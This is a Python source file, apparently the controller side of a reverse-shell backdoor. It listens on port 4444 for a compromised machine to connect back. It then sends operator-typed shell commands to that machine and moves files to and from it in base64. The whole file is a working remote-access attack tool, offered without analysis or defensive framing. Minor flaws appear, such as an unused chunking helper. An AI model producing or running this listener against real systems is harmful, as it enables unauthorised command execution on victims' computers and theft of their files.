import base64
import socket
import json
import sys


class Listener:
    def __init__(self):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind(("192.168.56.1", 4444))
        listener.listen(0)
        print("[+]Waiting for Connection")
        self.connection, self.address = listener.accept()
        print(f"[+]Get Connection from {str(self.address)}")

    def reliability_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliability_recv(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def send_large_data(self, command):
        # Break the data into smaller chunks and send them one by one
        data = command[2]  # Assuming the data is in command[2]
        chunk_size = 1024  # You can adjust the chunk size as needed

        for i in range(0, len(data), chunk_size):
            chunk = data[i:i + chunk_size]
            command[2] = chunk  # Replace the data in the command
            self.reliability_send(command)
    def remotely_command(self, command):
        self.reliability_send(command)
        if command[0].lower() == "exit":
            self.connection.close()
            sys.exit()
        return self.reliability_recv()

    def write_file(self, file_name, data_base_64):
        binary_data = base64.b64decode(data_base_64)
        with open(file_name, "wb") as file:
            file.write(binary_data)
        return f"[+]Downloaded Successfully"

    def read_file(self, file_name):
        try:
            with open(file_name, "rb") as file:
                file_data_binary = file.read()
        except Exception as e:
            file_data_binary = str(e)
        return base64.b64encode(file_data_binary).decode('utf-8')

    def run(self):
        while True:
            try:
                command = input(">> ")
                command = command.split(" ")
                if command[0].lower() == "upload":
                    file_result = self.read_file(command[1])
                    command.append(file_result)
                result = self.remotely_command(command)
                if command[0].lower() == "download":
                    result = self.write_file(command[1], result)
            except Exception as e:
                result = str(e)

            print(result)


Listener().run()
